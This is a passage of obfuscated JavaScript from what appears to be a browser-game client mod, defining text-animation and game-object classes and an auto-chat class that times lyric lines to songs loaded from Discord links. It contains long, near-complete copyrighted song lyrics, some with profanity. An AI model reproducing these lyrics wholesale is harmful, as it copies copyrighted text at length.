      this.color = _0x3a7ec2;
      this.scale = _0x23a150 * 3.5;
      this.weight = 50;
      this.startScale = this.scale * 1.2;
      this.maxScale = _0x23a150 * 1.5;
      this.minScale = _0x23a150 * 0.5;
      this.scaleSpeed = 0.7;
      this.speed = _0x4f5c30;
      this.speedMax = _0x4f5c30;
      this.life = _0x479262;
      this.maxLife = _0x479262;
      this.text = _0xa932de;
      this.movSpeed = _0x4f5c30;
    };
    this.update = function (_0x3abe2d) {
      if (this.life) {
        this.life -= _0x3abe2d;
        if (this.scaleSpeed != -0.35) {
          this.y -= this.speed * _0x3abe2d;
        } else {
          this.y -= this.speed * _0x3abe2d;
        }
        this.scale -= 0.8;
        if (this.scale >= this.maxScale) {
          this.scale = this.maxScale;
          this.scaleSpeed *= -0.5;
          this.speed = this.speed * 0.75;
        }
        ;
        if (this.life <= 0) {
          this.life = 0;
        }
      }
      ;
    };
    this.render = function (_0x3249fc, _0xea07f5, _0x80a803) {
      _0x3249fc.lineWidth = 10;
      _0x3249fc.strokeStyle = darkOutlineColor;
      _0x3249fc.fillStyle = this.color;
      _0x3249fc.globalAlpha = 1;
      _0x3249fc.font = this.scale + "px Hammersmith One";
      _0x3249fc.strokeText(this.text, this.x - _0xea07f5, this.y - _0x80a803);
      _0x3249fc.fillText(this.text, this.x - _0xea07f5, this.y - _0x80a803);
      _0x3249fc.globalAlpha = 1;
    };
  }
}
;
class Textmanager {
  constructor() {
    this.texts = [];
    this.stack = [];
    this.update = function (_0x1393fe, _0x17cf2b, _0x132aee, _0x4ba257) {
      _0x17cf2b.textBaseline = "middle";
      _0x17cf2b.textAlign = "center";
      for (let _0x30c3c8 = 0; _0x30c3c8 < this.texts.length; ++_0x30c3c8) {
        if (this.texts[_0x30c3c8].life) {
          this.texts[_0x30c3c8].update(_0x1393fe);
          this.texts[_0x30c3c8].render(_0x17cf2b, _0x132aee, _0x4ba257);
        }
      }
    };
    this.showText = function (_0x2e2330, _0x51cfe9, _0x20d173, _0x2eccf0, _0x539d16, _0x1fae8b, _0x34f529) {
      let _0x34dedf;
      for (let _0x181b88 = 0; _0x181b88 < this.texts.length; ++_0x181b88) {
        if (!this.texts[_0x181b88].life) {
          _0x34dedf = this.texts[_0x181b88];
          break;
        }
      }
      if (!_0x34dedf) {
        _0x34dedf = new Animtext();
        this.texts.push(_0x34dedf);
      }
      _0x34dedf.init(_0x2e2330, _0x51cfe9, _0x20d173, _0x2eccf0, _0x539d16, _0x1fae8b, _0x34f529);
    };
  }
}
class GameObject {
  constructor(_0x32c22b) {
    this.sid = _0x32c22b;
    this.init = function (_0x4ff714, _0x21f7e5, _0x2622b4, _0xdca040, _0x2716b3, _0x160349, _0x389f80) {
      _0x160349 = _0x160349 || {};
      this.sentTo = {};
      this.gridLocations = [];
      this.active = true;
      this.render = true;
      this.doUpdate = _0x160349.doUpdate;
      this.x = _0x4ff714;
      this.y = _0x21f7e5;
      this.dir = _0x2622b4;
      this.lastDir = _0x2622b4;
      this.xWiggle = 0;
      this.yWiggle = 0;
      this.visScale = _0xdca040;
      this.scale = _0xdca040;
      this.type = _0x2716b3;
      this.id = _0x160349.id;
      this.owner = _0x389f80;
      this.name = _0x160349.name;
      this.isItem = this.id != undefined;
      this.group = _0x160349.group;
      this.maxHealth = _0x160349.health;
      this.health = this.maxHealth;
      this.layer = 2;
      if (this.group != undefined) {
        this.layer = this.group.layer;
      } else if (this.type == 0) {
        this.layer = 3;
      } else if (this.type == 2) {
        this.layer = 0;
      } else if (this.type == 4) {
        this.layer = -1;
      }
      this.colDiv = _0x160349.colDiv || 1;
      this.blocker = _0x160349.blocker;
      this.ignoreCollision = _0x160349.ignoreCollision;
      this.dontGather = _0x160349.dontGather;
      this.hideFromEnemy = _0x160349.hideFromEnemy;
      this.friction = _0x160349.friction;
      this.projDmg = _0x160349.projDmg;
      this.dmg = _0x160349.dmg;
      this.pDmg = _0x160349.pDmg;
      this.pps = _0x160349.pps;
      this.zIndex = _0x160349.zIndex || 0;
      this.turnSpeed = _0x160349.turnSpeed;
      this.req = _0x160349.req;
      this.trap = _0x160349.trap;
      this.healCol = _0x160349.healCol;
      this.teleport = _0x160349.teleport;
      this.boostSpeed = _0x160349.boostSpeed;
      this.projectile = _0x160349.projectile;
      this.shootRange = _0x160349.shootRange;
      this.shootRate = _0x160349.shootRate;
      this.shootCount = this.shootRate;
      this.spawnPoint = _0x160349.spawnPoint;
      this.onNear = 0;
      this.breakObj = false;
      this.alpha = _0x160349.alpha || 1;
      this.maxAlpha = _0x160349.alpha || 1;
      this.damaged = 0;
    };
    this.changeHealth = function (_0x4670ee, _0x502ebb) {
      this.health += _0x4670ee;
      return this.health <= 0;
    };
    this.getScale = function (_0x2a018a, _0x37b1d6) {
      _0x2a018a = _0x2a018a || 1;
      return this.scale * (this.isItem || this.type == 2 || this.type == 3 || this.type == 4 ? 1 : _0x2a018a * 0.6) * (_0x37b1d6 ? 1 : this.colDiv);
    };
    this.visibleToPlayer = function (_0x1ec5bc) {
      return !this.hideFromEnemy || this.owner && (this.owner == _0x1ec5bc || this.owner.team && _0x1ec5bc.team == this.owner.team);
    };
    this.update = function (_0x4ecccd) {
      if (this.active) {
        if (this.xWiggle) {
          this.xWiggle *= Math.pow(0.99, _0x4ecccd);
        }
        if (this.yWiggle) {
          this.yWiggle *= Math.pow(0.99, _0x4ecccd);
        }
        let _0x534d54 = UTILS.getAngleDist(this.lastDir, this.dir);
        if (_0x534d54 > 0.01) {
          this.dir += _0x534d54 / 5;
        } else {
          this.dir = this.lastDir;
        }
      } else if (this.alive) {
        this.alpha -= _0x4ecccd / (200 / this.maxAlpha);
        this.visScale += _0x4ecccd / (this.scale / 2.5);
        if (this.alpha <= 0) {
          this.alpha = 0;
          this.alive = false;
        }
      }
    };
    this.isTeamObject = function (_0x2ec049) {
      if (this.owner == null) {
        return true;
      } else {
        return this.owner && _0x2ec049.sid == this.owner.sid || _0x2ec049.findAllianceBySid(this.owner.sid);
      }
    };
  }
}
class autoChatExport {
  constructor() {
    this.betterplace = {
      audio: new Audio("https://cdn.discordapp.com/attachments/1183826908270579813/1185869795611131955/Y2meta.app_-_NSYNC_-_Better_Place_Lyrics_128_kbps.mp3"),
      chats: [["It's some kind of love", 12587], ["it's some kind of fire", 14896], ["I'm already up", 17177], ["but you lift me higher", 19480], ["You know I'm not wrong", 22305], ["you know I'm not lyin'", 24384], ["We do it better, yeah", 26905], ["we do it better, yeah", 29176], ["I don't mind if the", 32641], ["world spins faster", 34625], ["The music's louder", 36857], [" the waves are get stronger", 39177], ["I don't mind if the world", 41368], ["spins faster", 43056], ["Faster, faster", 45698], ["Just let me take you to a better place", 48360], ["Just let me take you", 50018], ["to a better place", 52992], ["I'm gonna make you", 54121], ["kiss the sky tonight", 57008], ["Yeah, if you let me", 60712], ["show the way", 63440], ["I'm so excited", 65545], ["to see you excited", 69361], ["I'll take you to a better place", 70528], ["And, baby, you can", 73416], [" love me on the way", 77625], ["We're flyin' up to", 84696], ["outer space", 90849], ["I'm so excited", 92528], ["see you excited", 94688], ["You like the bed style loud", 96656], ["I wanna lose control", 98984], ["I wanna dance all night", 100800], ["you like it nice and slow", 102825], ["Don't want it any other way", 104992], ["tell all your friends", 107529], ["you're gonna stay", 108000][("When were together", 109433)], ["you know that we do it better", 111488], ["I don't mind if the", 113560], ["world spins faster", 115640], ["The music's louder,", 117673], ["the waves are gettin' stronger", 119664], ["I don't mind if the", 122736], ["world spins faster", 125489], ["Faster, faster", 126952], ["Just let me take you", 130552], ["to a better place", 132034], ["I'm gonna make you", 134656], ["kiss the sky tonight", 136944], ["Yeah, if you let me", 139176], ["show the way", 143368], ["I'm so excited", 144400], ["to see you excited", 147224], ["I'll take you to a", 151504], ["better place", 153464], ["And, baby, you can", 157224], ["love me on the way", 164936], ["We're flyin' up to", 167408], ["outer space", 175826], ["I'm so excited", 180280], ["to see you excited", 181288], ["", 184136], ["", 185408], ["", 188424], ["", 190392], ["", 192585], ["", 196664], ["", 200658], ["", 204832], ["", 206904]]
    };
    this.skyfall = {
      audio: new Audio("https://cdn.discordapp.com/attachments/1170751373374148690/1177509237509865544/Adele_Adele_-_Skyfall.mp3"),
      chats: [["This is the end", 33000], ["Hold your breath and count to 10", 38000], ["Feel the Earth move and then", 44000], ["Hear my heart burst again!", 50000], ["For this is the end", 58000], ["I've drowned and dreamt", 61200], ["this moment", 63000], ["So overdue, I owe them", 65400], ["Swept away, I'm stolen", 69600], ["Let the skyfall", 73800], ["When it crumbles", 75600], ["We will stand tall", 78000], ["Face it all together", 80300], ["Let the skyfall", 81720], ["When it crumbles", 83400], ["We will stand tall", 85200], ["Face it all together", 87600], ["At skyfall", 89700], ["At skyfall", 93300], ["Skyfall is where we start", 121200], ["thousand miles and poles apart", 124500], ["Where worlds collide", 127900], ["and days are dark", 129300], ["You may have my number", 130200], ["You can take my name", 132000], ["But you'll never have my heart", 134100], ["Let the skyfall", 136750], ["When it crumbles", 138600], ["We will stand tall", 140400], ["Face it all together", 142320], ["Let the skyfall", 144000], ["When it crumbles", 146520], ["We will stand tall", 148380], ["Face it all together", 150120], ["At skyfall", 151200], ["Where you go, I go", 191400], ["What you see, I see", 192600], ["I know I'd never be", 194400], ["me without the security", 196800], ["Of your loving arms", 198600], ["Keeping me from harm", 201000], ["Put your hand in my hand", 202800], ["And we'll stand", 204600], ["Let the skyfall", 206400], ["When it crumbles", 208200], ["We will stand tall", 210600], ["Face it all together", 211800], ["Let the skyfall", 214200], ["When it crumbles", 240000], ["We will stand tall", 241800], ["Face it all together", 243900], ["At skyfall", 245400], ["let the skyfall", 246900], ["we will stand tall", 250200], ["At skyfall", 252300], ["At skyfall", 252800], ["Oooh", 253400]]
    };
    this.staywithme = {
      audio: new Audio("https://cdn.discordapp.com/attachments/1013031910211063841/1029586481121071145/1nonly_-_Stay_With_Me_Lyrics.mp3"),
      chats: [["Stay with me", 1159], ["Stay with me", 20273], ["lil' bitch, yeah", 20907], ["you know that I'm your mans", 21691], ["You be cappin' like a snitch", 22668], ["no thots won't stand", 23857], ["Two hoes, ten toes", 25156], ["new guap, countin' bands", 26385], ["New whip, new chips", 27692], ["new kicks, Jackie Chan", 28888], ["And she bad", 30141], ["bad bitch throw it back", 31527], ["I just hit another lick and", 32798], ["she be counting all my racks", 33945], ["And I be feelin' hella rich", 35193], ["no Brian, hunnids stacked", 36503], ["'Bouta make another hit", 37857], ["goth bitch on my lap", 39117], ["Stay with me, lil' bitch, yeah", 40220], ["you know that I'm your mans", 41496], ["You be cappin' like a snitch", 42952], ["no thots won't stand", 44358], ["Two hoes, ten toes", 45378], ["new guap, countin' bands", 46633], ["New whip, new chips", 47962], ["new kicks, Jackie Chan", 49402], ["And she bad", 50500], ["bad bitch throw it back", 51768], ["I just hit another lick and", 52993], ["she be counting all my racks", 54091], ["And I be feelin' hella rich", 55483], ["no Brian, hunnids stacked", 56741], ["'Bouta make another hit", 58088], ["goth bitch on my lap", 59288], ["if she fucking with me", 60569], ["then you know I gotta get her", 61969], ["I be feelin' like Lil Uzi", 63413], ["got my mind up on the cheddar", 64329], ["Footloose getting groovy with", 65866], ["yo' ho, she like me better", 67130], ["I ain't talkin' Ash Kaashh", 68252], ["but that bitch", 69345], ["she be my header", 70322], ["Ayy, I'm posted up with twin", 71289], ["Glocks and foreign bitches", 72099], ["No fakes", 73271], ["all they want is guap", 73847], ["I burn bridges", 74978], ["I be getting to the bag", 75874], ["you still cleaning", 77061], ["dirty dishes", 77775], ["Two mops send shots at", 78331], ["your spot with no limit", 79634], ["Stay with me, lil' bitch, yeah", 80690], ["you know that I'm your mans", 82227], ["You be cappin' like a snitch", 83277], ["no thots won't stand", 84491], ["Two hoes, ten toes", 85727], ["new guap, countin' bands", 87152], ["New whip, new chips", 88356], ["new kicks, Jackie Chan", 89480], ["And she bad", 90797], ["bad bitch throw it back", 91851], ["I just hit another lick and", 93338], ["she be counting all my racks", 94752], ["And I be feelin' hella rich", 96045], ["no Brian, hunnids stacked", 97184], ["'Bouta make another hit", 98407], ["goth bitch on my lap", 99713], ["Stay with me, lil' bitch, yeah", 100910], ["you know that I'm your mans", 102385], ["You be cappin' like a snitch", 103510], ["no thots won't stand", 104783], ["Two hoes, ten toes", 105945], ["new guap, countin' bands", 107235], ["New whip, new chips", 108497], ["new kicks, Jackie Chan", 109744], ["And she bad", 110995], ["bad bitch throw it back", 112387], ["I just hit another lick and", 113531], ["she be counting all my racks", 114939], ["And I be feelin' hella rich", 116067], ["no Brian, hunnids stacked", 117268], ["'Bouta make another hit", 118726], ["goth bitch on my lap", 119972], ["Stay with me", 121136]]
    };
    this.legendsNeverDie = {
      audio: new Audio("https://cdn.discordapp.com/attachments/990882830210981920/991648349608493066/Legends_Never_Die_Lyrics_Ft._Against_The_Current.mp3"),
      chats: [["Legends Never Die", 12564], ["When the world is calling you", 16471], ["Can you hear them", 19616], ["screaming out your-", 20958], ["name?", 24132], ["Legends Never Die", 25823], ["They become a part of you", 29522], ["Every time you bleed", 33833], ["for reaching greatness", 36142], ["Relentless you survive", 40086], ["They never lose hope", 44050], ["when everything's cold", 45532], ["and the fighting's near", 46877], ["It's deep in their bones", 50361], ["they'll run into smoke", 52331], ["when the fire is fierce", 53631], ["Ohh pick yourself up cause,", 57260], ["Legends Never Die!", 60520], ["when the world is calling you", 64240], ["Can you hear them screaming", 67740], ["out your-", 69231], ["name?", 72521], ["Legends Never Die!", 74300], ["they become a part of you", 77900], ["Every time you bleed", 81620], ["for reaching", 83532], ["greatness", 85252], ["Legends Never Die", 87880], ["They're written", 91340], ["down in eternity", 92440], ["But you'll never see", 95140], ["the price it costs,", 97432], ["the scars collected", 100540], ["all their lives", 101720], ["When everything's lost", 105580], ["They pick up their hearts", 107440], ["and avenge defeat", 109320], ["Before it all starts,", 112680], ["they suffer through harm", 113980], ["just to touch a dream", 116020], ["Ohh pick yourself up cause,", 118840], ["Legends Never Die!", 122200], ["when the world is-", 126240], ["calling you", 127730], ["Can you hear them", 129760], ["screaming out your-", 131320], ["name?", 133320], ["Legends Never Die!", 135640], ["They become a part of you", 139500], ["Every time you bleed", 143180], ["for reaching-", 145320], ["greatness", 148100], ["Legends Never Die", 149440], ["When the world is", 156060], ["calling out", 157620], ["your name", 158900], ["Begging you to fight", 163320], ["Pick yourself up once more", 171160], ["Pick yourself up, cause", 174560], ["Legends Never Die!", 176860], ["when the world is", 180820], ["calling you", 181500], ["Can you hear them", 184400], ["screaming out your-", 186600], ["name?", 188300], ["Legends Never Die", 190780], ["They become a part of you", 194760], ["Every time you bleed", 197900], ["for reaching", 199300], ["greatness", 201500], ["Legends Never Die..", 204540]]
    };
    this.thetop = {
      audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/974478982051405934/Initial_D_5th_Stage_Soundtrack_-_The_Top.mp3"),
      chats: [["Final lap", 39607], ["I'm on top of the world", 40293], ["And I will never rest", 41845], ["for second again", 43192], ["One more time", 45303], ["I have beaten them out", 46438], ["The scent of gasoline", 47828], ["announces the end", 49351], ["They all said", 51320], ["I'd best give it up", 52316], ["What a fool", 53913], ["to believe their lies", 54752], ["Now they've fallen", 57207], ["and I'm at the top", 58373], ["Are you ready now to die?", 59879], ["I came up from the bottom", 62924], ["and into the top", 64572], ["For the first time", 65813], ["I feel alive", 66962], ["I can fly like an eagle", 68956], ["strike like a hawk", 70748], ["Do you think you can survive?", 71946], ["The top!", 74821], ["One more turn and", 87454], ["I'll settle the score", 88736], ["A rubber fire", 89794], ["screams into the night", 90734], ["Crash and burn is", 93127], ["what you're gonna do", 94471], ["I am a master of", 95752], ["the asphalt fight", 97250], ["They all said", 99128], ["I'd best give it up", 100438], ["What a fool", 101743], ["to believe their lies", 102673], ["Now they've fallen", 105251], ["and I'm at the top", 106445], ["Are you ready now to die?", 107891], ["I came up from the bottom", 110878], ["and into the top", 112544], ["For the first time", 113953], ["I feel alive", 114967], ["I can fly like an eagle", 116928], ["strike like a hawk", 118736], ["Do you think you can survive?", 119907], ["I came up from the bottom", 122969], ["and into the top", 124635], ["For the first time", 125972], ["I feel alive", 126979], ["I can fly like an eagle", 128989], ["strike like a hawk", 130755], ["Do you think you can survive?", 131906], ["The top!", 134941], ["I came up from the bottom", 171049], ["and into the top", 172624], ["For the first time", 173790], ["I feel alive", 174999], ["I can fly like an eagle", 176880], ["strike like a hawk", 178657], ["Do you think you can survive?", 179859], ["I came up from the bottom", 183009], ["and into the top", 184534], ["For the first time", 185837], ["I feel alive", 187606], ["I can fly like an eagle", 188853], ["strike like a hawk", 190569], ["Do you think you can survive?", 191750], ["The top!", 194704]]
    };
    this.gas = {
      audio: new Audio("https://cdn.discordapp.com/attachments/876683706381762560/981927132202672228/e.mp3"),
      chats: [["Ahhh", 16885], ["(gas, gas gas)", 20000], ["Ahhh", 24039], ["Do you like my car", 28341], ["my car", 31349], ["m y   c a r", 33137], ["Guess you're ready'", 53875], ["Cause I'm waiting for you", 54746], ["It's gonna be so exciting!", 56201], ["Got this feeling", 59363], ["Really deep in my soul", 60638], ["Let's get out I wanna go", 62462], ["come along get it on!", 64003], ["Gonna take my car", 65865], ["gonna sit in", 67463], ["Gonna drive alone", 69113], ["'till I get you", 70348], ["'Cause I'm crazy", 71831], ["hot and ready", 72635], ["but you'll like it!", 73624], ["I wanna race for you", 74930], ["shall I go now?", 76885], ["Gas gas gas", 78234], ["I'm gonna step on the gas", 79868], ["Tonight I'll fly", 81582], ["and be your lover", 83111], ["Yeah yeah yeah", 84323], ["I'll be so quick as a flash", 86116], ["And I'll be your hero!", 87777], ["Gas gas gas", 90637], ["I'm gonna run as a flash", 92633], ["Tonight I'll fight", 94096], ["to be the winner", 95500], ["Yeah yeah yeah", 96824], ["I'm gonna step on the gas", 98592], ["And you'll see the big show!", 100155], ["Don't be lazy", 115451], ["'Cause I'm burning for you", 116581], ["It's like a hot sensation!", 118681], ["Got this power", 121655], ["That is taking me out", 122845], ["Yes I've got a crush on you", 124771], ["Ready now ready go!", 126452]]
    };
    this.dejavu = {
      audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/974636785101582366/DAVE_RODGERS___DEJA_VU_Official_Lyric_VideoD_INITIAL_D.mp3"),
      chats: [["See your body", 46729], ["into the moonlight", 48320], ["Even if I try to cancel", 49803], ["All the pictures into the mind", 52998], ["There's a flashing in my eyes", 55715], ["Don't you see my condition", 58299], ["The fiction", 61009], ["is gonna run it again", 62601], ["Can't you see now illusions", 64399], ["Right into your mind", 67186], ["Deja vu", 71102], ["I've just been", 72205], ["in this place before", 72846], ["Higher on the street", 74070], ["And I know it's my time to go", 75226], ["Calling you and", 77414], ["the search is a mystery", 78540], ["Standing on my feet", 80256], ["It's so hard when", 81402], ["I try to be me", 82361], ["UOOOHH", 83974], ["Deja vu", 85496], ["I've just been in", 86224], ["this time before", 86992], ["Higher on the street", 88087], ["And I know it's a place to go", 89232], ["Calling you and", 91432], ["the search is a mystery", 92534], ["Standing on my feet", 94184], ["It's so hard when", 95454], ["I try to be me", 96331], ["YEAHHH", 97862], ["See the future", 111909], ["into the present", 113614], ["See my past lives", 115335], ["in the distance", 116885], ["Try to guess now", 118423], ["what's going on", 120073], ["And the band begins to play", 121129], ["Don't you see my condition", 123653], ["The fiction", 126436], ["is gonna run it again", 128002], ["Can't you see now illusions", 129709], ["Right into your mind", 132703], ["Deja vu", 136269], ["I've just been", 137353], ["in this place before", 138199], ["Higher on the street", 139454], ["And I know", 140683], ["it's my time to go", 141457], ["Calling you", 142833], ["and the search is a mystery", 143741], ["Standing on my feet", 145424], ["It's so hard when", 146779], ["I try to be me", 147596], ["UOOOHH", 149231], ["Deja vu", 150890], ["I've just been in", 151580], ["this time before", 152301], ["Higher on the beat", 153484], ["And I know it's", 154656], ["a place to go", 155631], ["Calling you", 156815], ["and the search is a mystery", 158038], ["Standing on my feet", 159645], ["It's so hard when", 160557], ["I try to be me", 161571], ["YEAHHH", 163347]]
    };
    this.norival = {
      audio: new Audio("https://cdn.discordapp.com/attachments/784941059066167316/977724487283912735/Nightcore_-_No_Rival_-_Lyrics.mp3"),
      chats: [["Here and now", 11198], ["you're coming up to me", 12140], ["'Fore I'm lighting up the sky", 13500], ["Feel the ground", 16583], ["shaking underneath", 17638], ["Trying to take me alive", 18855], ["Oh-oh-ohhh", 21720], ["Get ready for the fallout", 24012], ["Oh-oh-ohhh", 26981], ["Can't stop me now", 29312], ["I got no rival", 31419], ["I'ma find my way", 33196], ["Through the blood and pain", 35172], ["Game of survival", 36491], ["Any time or place", 38528], ["Watch 'em run away", 40492], ["I got no", 41945], ["I'll be standing on my own", 43651], ["Never gonna take my thrown", 45499], ["I got no rival", 47335], ["Watch 'em run away", 49108], ["I got no, no, no", 50943], ["I got no, no, no rival", 52146], ["No rival", 63910], ["No rival", 69272], ["Tell them now what you gon' do", 75032], ["We can do this face to face", 77157], ["Reckoning is coming in soon", 80284], ["Doesn't matter what you say", 82523], ["Trying to tell you", 85098], ["listen to the moment", 86269], ["Can't take mine", 87544], ["'cause I own it", 88213], ["Don't you know that", 90057], ["I'm locked and I'm loaded", 91775], ["You're out of focus", 93433], ["Oh-oh-ohhh", 96303], ["Get ready for the fallout", 98299], ["Oh-oh-ohhh", 101475], ["Can't stop me now", 103533], ["I got no rival", 105353], ["I'ma find my way", 107419], ["Through the blood and pain", 109215], ["Game of survival", 110747], ["Any time or place", 112730], ["Watch 'em run away", 114664], ["I got no", 116031], ["I'll be standing on my own", 117862], ["Never gonna take my thrown", 119722], ["I got no rival", 121376], ["Watch 'em run away", 123338], ["I got no, no, no", 125165], ["I got no, no, no rival", 126388], ["No rival", 132506], ["I got no, no, no", 136063], ["I got no, no, no rival", 137058], ["No rival", 143220], ["No rival", 159585]]
    };
    this.inv = {
      audio: new Audio("https://cdn.discordapp.com/attachments/975954604451831828/980059990356279316/Crypt_x_Joey_Nato_-_Invincible_feat._soslesion_OFFICIAL_MUSIC_VIDEO.mp3"),
      chats: [["Yeah, yeah, yeah", 3890], ["Get myself into the game", 11624], ["I'ma run it up anyway", 13854], ["I get with the violence", 17898], ["I don't think you wanna try it", 19893], ["I'm so up", 22911], ["I feel invincible", 23678], ["I don't know", 26102], ["if they get it though", 26784], ["I'm so up", 28401], ["I feel invincible", 29073], ["Fuck what you said", 31587], ["I'm invincible", 32639], ["Lookin' for a break", 34483], ["and now I think", 35417], ["I finally caught one", 36239], ["We're talkin'", 37281], ["legendary status", 38092], ["when it's all done", 39193], ["I'm a star bitch", 40259], ["if you ever saw one", 41257], ["Law and Order over here", 43408], ["and it's a Tommy one", 44760], ["Meet me at the top", 45828], ["it's goin' down", 47841], ["They tryna fit in my circle", 48355], ["I'm not around (Nah)", 49618], ["I was down before", 50887], ["but not for the count", 52516], ["Shit was real heavy", 53741], ["now it's dollars", 55010], ["not the pound", 55590], ["Tell me what you smokin'", 56879], ["if you think that I'm a joke", 57801], ["Only time I'm trippin'", 59455], ["is when I'm out on a road", 60356], ["Only droppin' joints", 62286], ["if that is fuckin' dope", 63270], ["Scary when you see me", 65141], ["got them meming me like nope", 66211], ["(Nope, nope, nope, nope)", 67656], ["Hate to say it, but", 68886], ["you're runnin' out of time", 70326], ["I don't know 'bout you, but", 72052], ["I'ma make the most of mine", 72845], ["Lookin' clean until", 74738], ["a youngin' in the dirt", 75742], ["Value through the roof", 77076], ["yeah, yeah", 78516], ["I know my worth, Nato", 79436], ["Get myself into the game", 80575], ["I'ma run it up anyway", 82594], ["I get with the violence", 85923], ["I don't think you wanna try it", 88419], ["I'm so up", 91257], ["I feel invincible", 91995], ["I don't know if they get it though", 94660], ["I'm so up", 96966], ["I feel invincible", 97642], ["Fuck what you said", 99967], ["I'm invincible", 101046], ["If you wanna try", 103308], ["to bring me down", 103971], ["you gotta reach me", 104685], ["I'm high up in the clouds", 105864], ["while your're just", 107039], ["down in the seaweeds", 107608], ["I see these little rappers", 108622], ["they all wanna be me", 109897], ["But nobody wanna put the work in", 110826], ["'Cause they thinkin'", 112134], ["that I got it easy", 112752], ["but that's sleezy", 113502], ["My path to the top was hard", 114485], ["but nothin' out there", 115575], ["could me make stop", 116247], ["Every time I thought", 116981], ["it went one way", 117624], ["it turned out that it did not", 118407], ["I got so many", 119291], ["obstacles for my opps", 120297], ["so many prayin'", 121206], ["that I would drop", 122096], ["I had to go around", 122774], ["the whole world", 123521], ["just to get to", 124260], ["the end of my block", 124866], ["I built my skin so tough", 125523], ["achievin' all my desires", 126727], ["I could walk through", 128065], ["Hell without gettin'", 129449], ["burned by the fire", 130009], ["Oh, I admire those", 130697], ["that are deniers", 132867], ["'Cause you messed around", 134285], ["turned me to a", 135069], ["cold blooded fighter", 135885], ["Im so up I feel invincible", 137218], ["I hope my words", 140013], ["feel like insults", 141190], ["I'm up right now", 142979], ["you stuck right now", 144030], ["Stay down there", 145496], ["on that ground", 146574], ["Get myself into the game", 147924], ["I'ma run it up anyway", 151037], ["I get with the violence", 154527], ["I don't think you wanna try it", 156787], ["I'm so up", 160415], ["I feel invincible", 160990], ["I don't know", 163133], ["if they get it though", 163952], ["I'm so up", 165446], ["I feel invincible", 166148], ["Fuck what you said", 168516], ["I'm invincible", 169519], ["Talk like I'm at the top now", 171475], ["If you hit me, I can't fall down", 173836], ["Run up, I'm not second place and", 177162], ["I tell 'em that in runnin'", 178025], ["all my bases", 181206], ["I'm so up", 182808], ["I feel invincible", 183340], ["I don't know if", 186082], ["they get it though", 186813], ["I'm so up", 188342], ["I feel invincible", 189013], ["Fuck what you said", 192064], ["I'm invincible", 192606]]
    };
    this.giants = {
      audio: new Audio("https://cdn.discordapp.com/attachments/617560371913293827/1023807988047294464/V_O_E_-_Giants_Lyrics.mp3"),
      chats: [["Oh, where am I going now", 10213], ["just falling over dreams?", 11952], ["Now I'm just so far gone", 15815], ["this isn't what it seems..", 17563], ["It's taking me so damn long", 21274], ["it's fading from believe", 23182], ["I need to slow this down", 26880], ["it's burning from beneath", 28361], ["Come break this light", 32622], ["Before tomorrow dies", 35938], ["Holding on for what", 38578], ["is worth my life", 40752], ["I know in time", 43714], ["I'll make it up the vine", 46797], ["Find my way to giants", 49458], ["in the sky", 51305], ["Tonight it comes to life", 53609], ["Tonight it comes to life", 75604], ["Where am I going now,", 98364], ["just falling over dreams?", 101623], ["Now I'm just so far gone,", 104059], ["this isn't what it seems", 106393], ["It's taking me so damn long,", 109598], ["it's fading from believe", 110995], ["I need to slow this down", 115074], ["it's burning from beneath", 117293], ["Come break this light", 121103], ["Before tomorrow dies", 124000], ["Holding on for what", 126824], ["is worth my lifе", 128132], ["I know in time", 132000], ["I'll make it up the vinе", 135098], ["Find my way to", 137797], ["giants in the sky", 139231], ["Tonight it comes to life", 141870], ["Tonight it comes to life", 152722], ["Come break this light", 176157], ["Before tomorrow dies", 179155], ["Holding on to what is", 181855], ["worth my life", 183000], ["I know in time", 187145], ["I'll make it up the vine", 190330], ["Find my way to", 193014], ["giants in the sky", 195132], ["Tonight it comes to life", 197183]]
    };
    this.glorydays = {
      audio: new Audio("https://cdn.discordapp.com/attachments/990241234696167428/1023774910067261590/FELLOWSHIP_-_Glory_Days_Official_Lyric_Video_192_kbps.mp3"),
      chats: [["As the light within me falls", 47320], ["another day departs", 49338], ["if only I could see", 52172], ["the dawn beyond", 54166], ["the shadows cast", 55214], ["An empire of doubt", 57561], ["a heart full of clouds", 58671], ["befall the souls within her", 60113], ["the valley will weep", 62134], ["as a mirror of old", 63920], ["as hope is halfway damned", 65463], ["Oh, to see our last day", 68481], ["with all these", 70021], ["shattered voices raised", 71037], ["Oh say, will you fight?", 72920], ["To seek the glory days,", 77842], ["We'll fight the lion's way", 80642], ["Then let the rain", 83334], ["wash all of our pride away", 85272], ["So if this victory", 88786], ["is our last odyssey,", 91400], ["Then let the power", 94134], ["within us decide!", 96046], ["On the backs of giants", 117344], ["long deceased", 119252], ["are we still standing", 120096], ["we measure our worth", 122557], ["by all the days", 123929], ["we wasted then.", 125403], ["All of our time", 127753], ["and all of our might", 128916], ["are fueled by", 130086], ["the heartache of winter.", 131045], ["Oh life as we know", 132595], ["it is bitter and cold", 133924], ["but souls burn", 135278], ["best with spite.", 136334], ["Oh, to see our last day", 138568], ["with all these", 140287], ["shattered voices raised", 141002], ["Oh say, will you fight?", 142849], ["To seek the glory days,", 147919], ["We'll fight the lion's way", 150668], ["Then let the rain", 153331], ["wash all of our pride away", 155055], ["So if this victory", 158747], ["is our last odyssey,", 161502], ["Then let the power", 164244], ["within us decide!", 166385], ["If we have to choose our fate,", 170992], ["It's still our choice to make", 175794], ["Oh, to see our last day", 235540], ["with all these", 237420], ["shattered voices raised", 238154], ["Oh say, will you fight?", 239979], ["To seek the glory days,", 244971], ["We'll fight the lion's way", 247863], ["Then let the rain", 250476], ["wash all of our pride away", 252209], ["To seek the glory days,", 255934], ["We'll fight the lion's way", 258458], ["Then let the rain", 261368], ["wash all of our pride away", 263131], ["So if this victory", 266838], ["is our last odyssey,", 269354], ["Let the power within", 272733], ["ignite where we've been", 274332], ["let the power within us decide", 277877]]
    };
    this.ipip = {
      audio: new Audio("https://cdn.discordapp.com/attachments/1008700151579295824/1023235261066399744/Electro-Light_-_Symbolism_NCS_Release.mp3"),
